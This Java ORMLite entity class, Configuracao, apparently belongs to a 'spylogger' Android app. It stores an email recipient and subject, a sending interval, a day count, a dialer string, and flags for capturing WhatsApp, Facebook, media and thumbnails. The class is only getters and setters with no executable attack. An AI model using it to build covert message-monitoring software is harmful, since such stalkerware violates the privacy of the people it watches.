package com.gravatasufoca.spylogger.model;

import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;

import java.io.Serializable;

@DatabaseTable
public class Configuracao extends EntidadeAbstrata{
	private static final long serialVersionUID = -4679985146526783051L;

	public Configuracao() {
	}

	@Override
	public Serializable getId() {
		// TODO Auto-generated method stub
		return _id;
	}

	@DatabaseField(generatedId=true)
	private Integer _id;

	@DatabaseField()
	private String emailTo;

	@DatabaseField()
	private Integer intervalo;

	@DatabaseField()
	private Integer dias;

	@DatabaseField()
	private boolean firstTime=true;

	@DatabaseField()
	private String dialer;

	@DatabaseField()
	private String subject;

	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean miniatura;

	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean media;

	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean whatsApp;

	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean facebook;

	public String getEmailTo() {
		return emailTo;
	}

	public void setEmailTo(String emailTo) {
		this.emailTo = emailTo;
	}

	public Integer getIntervalo() {
		return intervalo;
	}

	public void setIntervalo(Integer intervalo) {
		this.intervalo = intervalo;
	}

	public boolean isFirstTime() {
		return firstTime;
	}
	public void setFirstTime(boolean firstTime) {
		this.firstTime = firstTime;
	}

	public String getDialer() {
		return dialer;
	}
	public void setDialer(String dialer) {
		this.dialer = dialer;
	}

	public String getSubject() {
		return subject;
	}
	public void setSubject(String subject) {
		this.subject = subject;
	}

	public boolean isMedia() {
		return media;
	}
	public void setMedia(boolean media) {
		this.media = media;
	}
	public boolean isMiniatura() {
		return miniatura;
	}
	public void setMiniatura(boolean miniatura) {
		this.miniatura = miniatura;
	}

	public Integer getDias() {
		return dias;
	}
	public void setDias(Integer dias) {
		this.dias = dias;
	}

	public void setWhatsApp(boolean whatsApp) {
		this.whatsApp = whatsApp;
	}
	public boolean isWhatsApp() {
		return whatsApp;
	}
	public void setFacebook(boolean facebook) {
		this.facebook = facebook;
	}
	public boolean isFacebook() {
		return facebook;
	}
}
